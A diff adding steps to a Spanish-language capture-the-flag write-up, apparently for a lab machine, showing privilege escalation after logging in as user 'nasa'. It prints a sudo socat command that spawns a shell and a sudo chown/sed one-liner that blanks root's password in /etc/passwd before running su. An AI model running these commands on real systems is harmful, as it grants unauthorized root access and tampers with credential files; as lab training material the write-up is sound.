@@ -98,3 +98,22 @@ Listando los directorios tenemos un archivo oculto.
 
 Vemos que tenemos 3 usuarios y uno de ellos es la **nasa** asi que nos logueamos ya que la contraseña es **Eisenhower.**
 
+<figure><img src="../../.gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>
+
+Nos llama la atención **socat** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/socat/)cómo explotarlo.
+
+```bash
+sudo -u elite /usr/bin/socat stdin exec:/bin/sh
+```
+
+<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>
+
+Nos llama la atención **chown** por lo que buscamos en esta [página ](https://gtfobins.github.io/gtfobins/chown/)cómo explotarlo.
+
+```bash
+sudo chown elite:elite /etc/ && sudo chown elite:elite /etc/passwd && echo "$(cat /etc/passwd | sed 's/root:x:/root::/g')" > /etc/passwd && su
+```
+
+<figure><img src="../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>
